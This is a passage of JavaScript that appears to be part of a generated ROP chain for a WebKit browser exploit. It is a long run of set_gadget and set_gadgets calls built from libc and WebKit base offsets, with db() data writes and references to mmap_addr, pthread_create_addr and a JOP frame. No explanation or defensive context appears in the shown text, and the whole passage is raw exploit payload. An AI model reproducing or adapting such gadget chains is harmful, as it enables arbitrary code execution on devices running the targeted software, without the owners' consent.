webkit_base+7438103,
libc_base+793877,
ropchain+151672,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+151640,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+151792,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+151776,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967284, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+151936,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+151952,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+152096,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+152064,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+152080,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+152168,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+152224,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+152304,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+152408,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+152424,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+152576,
webkit_base+7438103,
libc_base+793877,
ropchain+152608,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+152560,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+152592,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+152728,
webkit_base+7438103,
libc_base+793877,
ropchain+152744,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+152712,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+152832,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+152888,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+152960,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+793877
]);

db([40, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+153104,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+153120,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+153264,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+153232,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+153248,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+153344,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+153448,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+153464,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+153608,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+153576,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+153592,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+153680,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+153736,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+153816,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+153920,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+153936,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+154088,
webkit_base+7438103,
libc_base+793877,
ropchain+154120,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+154072,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+154104,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+154240,
webkit_base+7438103,
libc_base+793877,
ropchain+154256,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+154224,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+154344,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+154400,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+154496,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+154552,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([16, 0]);
set_gadget(libc_base+788575,);

db([16, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+154704,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+154760,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+154864,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([32, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+154968,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+154984,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+155128,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+155096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+155112,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+155208,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+155312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+155328,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+155472,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+155440,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+155456,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+155576,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+86456,

libc_base+882884,
libc_base+793877
]);
db([4294967264, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+155648,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967272, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+155752,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+155768,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+155912,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+155880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+155896,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

jop_frame_addr,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+156040,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([24, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+156144,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+156160,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+156304,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+156272,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+156288,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+156384,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+156488,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+156504,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+156648,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+156616,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+156632,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+156752,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+158912,

libc_base+882884,
libc_base+793877
]);
db([4294967264, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+156888,
webkit_base+7438103,
libc_base+793877,
ropchain+156904,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+156872,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+157024,
webkit_base+7438103,
libc_base+793877,
ropchain+157040,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+157008,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+157136,
webkit_base+7438103,
libc_base+793877,
ropchain+157152,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+157264,
webkit_base+7438103,
libc_base+793877,
ropchain+157248,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+157352,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+157336,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+157448,
webkit_base+7438103,
libc_base+793877,
ropchain+157464,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+157576,
webkit_base+7438103,
libc_base+793877,
ropchain+157560,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
mmap_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+158904,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
pthread_create_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+160232,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+160304,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+160368,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+160464,
webkit_base+7438103,
libc_base+793877,
ropchain+160480,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+160592,
webkit_base+7438103,
libc_base+793877,
ropchain+160576,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+160664,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+160752,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+160784,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+160896,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+160880,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+161032,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+161016,
webkit_base+7438103,
libc_base+206806,

ropchain+136,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+161184,
webkit_base+7438103,
libc_base+793877,
ropchain+161216,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+161168,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+161200,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+161288,
webkit_base+7438103,
libc_base+793877,
ropchain+161304,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+161424,
webkit_base+7438103,
libc_base+793877,
ropchain+161440,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+161408,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+8824269,
libc_base+269973,
libc_base+793877,
ropchain+161608,
webkit_base+7438103,
libc_base+793877,
ropchain+161624,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+161592,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+161728,
webkit_base+7438103,
libc_base+793877,
ropchain+161776,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+161744,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+161888,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+161880,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+161904,
ropchain+162728,
libc_base+50775,
libc_base+793877,
ropchain+161944,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([1, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+162072,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+162056,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+162168,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+162312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+162296,
webkit_base+7438103,
libc_base+206806,

ropchain+136,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+162464,
webkit_base+7438103,
libc_base+793877,
